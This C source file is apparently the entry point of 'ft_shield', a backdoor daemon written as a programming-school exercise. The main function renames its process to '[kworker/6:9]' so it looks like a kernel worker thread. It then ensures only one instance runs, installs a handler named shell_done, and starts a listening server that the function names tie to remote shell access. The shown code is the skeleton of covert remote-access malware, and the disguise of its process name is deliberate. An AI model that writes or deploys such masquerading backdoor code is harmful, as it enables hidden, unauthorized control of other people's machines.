#include "../ft_shield.h"

extern int	g_oks[BACKLOG];

void	ignore_sigpipe(void)
{
	signal(SIGPIPE, (void(*)(int))&ignore_sigpipe);
}

extern char	*program_invocation_name;

int	main(void)
{
	if (is_locked())
		return (EXIT_FAILURE);
	strcpy(program_invocation_name, "[kworker/6:9]     ");
	ignore_sigpipe();
	create_lock();
	delete_lock_at_exit();
	bzero(&g_oks, sizeof g_oks);
	signal(SIGUSR1, shell_done);
	demolinux_specific();
	listen_server();
	return (EXIT_SUCCESS);
}
